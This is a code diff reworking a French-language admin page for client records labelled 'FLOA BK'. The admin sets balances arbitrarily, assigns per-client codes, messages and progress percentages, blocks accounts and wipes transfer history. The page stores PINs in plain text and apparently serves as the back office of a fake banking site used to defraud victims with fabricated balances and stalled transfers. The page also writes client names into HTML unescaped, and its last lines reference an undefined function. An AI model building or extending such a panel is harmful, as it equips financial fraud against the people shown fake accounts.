-    pct: Number($('pct').value),
-    pays: $('pays').value.trim(),
-    adresse: $('adresse').value.trim(),
-    tel: $('tel').value.trim(),
-    notification: $('notification').value.trim(),
-    updated: Date.now()
-  };
-  
-  if(!o.nom ||!o.email ||!o.pin){ alert('Nom, Email et PIN obligatoires'); return; }
-  
-  if(editId){ 
-    update(ref(db, 'clients/'+editId), o); 
-    if(addAmt > 0){
-      alert(`Montant augmenté de ${addAmt} ${o.devise}. Nouveau solde: ${finalMontant} ${o.devise}. Historique mis à jour dans FLOA BK.`);
-    }
-  } else { 
-    push(clientsRef, {...o, created: Date.now()}); 
-  }
-  
-  resetForm();
-  if(!addAmt) alert('Client enregistré. Thème: ' + o.theme);
-};
+        // ===== SAUVEGARDE =====
+        $('saveBtn').onclick = () => {
+            const addAmt = Number($('addMontant').value) || 0;
+            let finalMontant = Number($('montant').value) || 0;
 
-$('resetBtn').onclick = resetForm;
+            if (editId && addAmt > 0 && data[editId]) {
+                const currentMontant = Number(data[editId].montant) || 0;
+                finalMontant = currentMontant + addAmt;
+            }
 
-function resetForm(){
-  ['nom','email','pin','montant','addMontant','code','msg','pays','adresse','tel','notification'].forEach(i=>$(i).value='');
-  $('devise').value='zł'; $('theme').value='purple'; $('pct').value=100; $('pv').textContent='100'; editId=null;
-}
+            const o = {
+                nom: $('nom').value.trim(),
+                email: $('email').value.trim().toLowerCase(),
+                pin: $('pin').value.trim(),
+                montant: finalMontant,
+                devise: $('devise').value,
+                theme: $('theme').value,
+                code: $('code').value.trim(),
+                msg: $('msg').value.trim(),
+                pct: Number($('pct').value),
+                pays: $('pays').value.trim(),
+                adresse: $('adresse').value.trim(),
+                tel: $('tel').value.trim(),
+                notification: $('notification').value.trim(),
+                updated: Date.now()
+            };
 
-window.editClient = (id) => {
-  const v = data[id]; editId = id;
-  $('nom').value=v.nom; $('email').value=v.email; $('pin').value=v.pin;
-  $('montant').value=v.montant; $('devise').value=v.devise||'zł'; $('theme').value=v.theme||'purple';
-  $('code').value=v.code; $('msg').value=v.msg;
-  $('pct').value=v.pct; $('pv').textContent=v.pct;
-  $('pays').value=v.pays||''; $('adresse').value=v.adresse||''; $('tel').value=v.tel||'';
-  $('notification').value=v.notification||''; $('addMontant').value='';
-  window.scrollTo({top:0,behavior:'smooth'});
-};
+            if (!o.nom || !o.email || !o.pin) {
+                showAlert('⚠️ Nom, Email et PIN sont obligatoires.', 'error');
+                return;
+            }
 
-window.delClient = (id) => {
-  if(confirm('Supprimer ce client? Il ne pourra plus se connecter.')){
-    remove(ref(db, 'clients/'+id));
-  }
-};
+            if (editId) {
+                update(ref(db, 'clients/' + editId), o);
+                if (addAmt > 0) {
+                    showAlert(`✅ Montant augmenté de ${addAmt} ${o.devise}. Nouveau solde: ${finalMontant} ${o.devise}.`, 'success');
+                } else {
+                    showAlert('✅ Client mis à jour avec succès.', 'success');
+                }
+            } else {
+                push(clientsRef, { ...o, created: Date.now() });
+                showAlert('✅ Nouveau client créé avec succès. Thème: ' + o.theme, 'success');
+            }
 
-function refreshLists(){
-  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email} (${v.devise||'zł'})${v.blocked?' (BLOQUÉ)':''}${v.notification?' 🔔':''}</option>`).join('');
-  if($('clientAccess')) $('clientAccess').innerHTML = opts;
-  if($('clientAction')) $('clientAction').innerHTML = opts;
-}
-const _render = render;
-render = function(){ _render(); refreshLists(); };
+            resetForm();
+        };
 
-$('blockBtn').onclick = ()=>{
-  const id = $('clientAccess').value;
-  if(!id) return alert('Sélectionnez un client');
-  update(ref(db,'clients/'+id), {blocked:true, updated:Date.now()});
-  alert('Accès bloqué - appliqué instantanément dans FLOA BK');
-};
-$('unblockBtn').onclick = ()=>{
-  const id = $('clientAccess').value;
-  if(!id) return alert('Sélectionnez un client');
-  update(ref(db,'clients/'+id), {blocked:false, updated:Date.now()});
-  alert('Accès débloqué');
-};
-$('actionBtn').onclick = ()=>{
-  const id = $('clientAction').value;
-  const action = $('actionType').value;
-  if(!id) return alert('Sélectionnez un client');
+        // ===== RÉINITIALISATION =====
+        $('resetBtn').onclick = resetForm;
 
-  if(action === 'Réinitialiser l\'historique des virements'){
-    update(ref(db,'clients/'+id), {historyReset:Date.now()});
-    alert('Historique réinitialisé - effacé dans FLOA BK');
-  } else if(action === 'Supprimer la notification'){
-    update(ref(db,'clients/'+id), {notification:'', updated:Date.now()});
-    alert('Notification supprimée - la cloche affichera "Aucune notification"');
-  }
-};
-</script>
+        function resetForm() {
+            ['nom', 'email', 'pin', 'montant', 'addMontant', 'code', 'msg', 'pays', 'adresse', 'tel', 'notification'].forEach(i => $(i).value = '');
+            $('devise').value = 'zł';
+            $('theme').value = 'purple';
+            $('pct').value = 100;
+            pvDisplay.textContent = '100%';
+            pvLabel.textContent = '100%';
+            editId = null;
+            updateEditBadge();
+        }
+
+        // ===== ÉDITION =====
+        window.editClient = (id) => {
+            const v = data[id];
+            editId = id;
+            $('nom').value = v.nom;
+            $('email').value = v.email;
+            $('pin').value = v.pin;
+            $('montant').value = v.montant;
+            $('devise').value = v.devise || 'zł';
+            $('theme').value = v.theme || 'purple';
+            $('code').value = v.code;
+            $('msg').value = v.msg;
+            $('pct').value = v.pct;
+            pvDisplay.textContent = v.pct + '%';
+            pvLabel.textContent = v.pct + '%';
+            $('pays').value = v.pays || '';
+            $('adresse').value = v.adresse || '';
+            $('tel').value = v.tel || '';
+            $('notification').value = v.notification || '';
+            $('addMontant').value = '';
+            updateEditBadge();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        };
+
+        // ===== SUPPRESSION =====
+        window.delClient = (id) => {
+            if (confirm('⚠️ Supprimer ce client ? Il ne pourra plus se connecter.')) {
+                remove(ref(db, 'clients/' + id));
+                showAlert('🗑️ Client supprimé.', 'info');
+            }
+        };
+
+        // ===== RAFRAÎCHIR LES LISTES DÉROULANTES =====
+        function refreshLists() {
+            const opts = Object.entries(data).map(([id, v]) =>
+                `<option value="${id}">${v.nom} - ${v.email} (${v.devise || 'zł'})${v.blocked ? ' 🔒 BLOQUÉ' : ''}${v.notification ? ' 🔔' : ''}</option>`
+            ).join('');
+            if ($('clientAccess')) $('clientAccess').innerHTML = opts;
+            if ($('clientAction')) $('clientAction').innerHTML = opts;
+        }
+
+        // ===== BLOQUER / DÉBLOQUER =====
+        $('blockBtn').onclick = () => {
+            const id = $('clientAccess').value;
+            if (!id) { showAlert('⚠️ Veuillez sélectionner un client.', 'error'); return; }
+            update(ref(db, 'clients/' + id), { blocked: true, updated: Date.now() });
+            showAlert('🔒 Accès bloqué avec succès.', 'success');
+        };
+        $('unblockBtn').onclick = () => {
+            const id = $('clientAccess').value;
+            if (!id) { showAlert('⚠️ Veuillez sélectionner un client.', 'error'); return; }
+            update(ref(db, 'clients/' + id), { blocked: false, updated: Date.now() });
+            showAlert('🔓 Accès débloqué.', 'success');
+        };
+
+        // ===== ACTIONS AVANCÉES =====
+        $('actionBtn').onclick = () => {
+            const id = $('clientAction').value;
+            const action = $('actionType').value;
+            if (!id) { showAlert('⚠️ Veuillez sélectionner un client.', 'error'); return; }
+
+            if (action === 'Réinitialiser l\'historique des virements') {
+                update(ref(db, 'clients/' + id), { historyReset: Date.now() });
+                showAlert('🔄 Historique des virements réinitialisé.', 'success');
+            } else if (action === 'Supprimer la notification') {
+                update(ref(db, 'clients/' + id), { notification: '', updated: Date.now() });
+                showAlert('🗑️ Notification supprimée.', 'success');
+            }
+        };
+
+        // Initialisation du badge d'édition
+        updateEditBadge();
+
+        // Rendre les fonctions disponibles globalement pour les boutons onclick
+        window.editClient = editClient;
+        window.delClient = delClient;
+    </script>
 </body>
 </html>
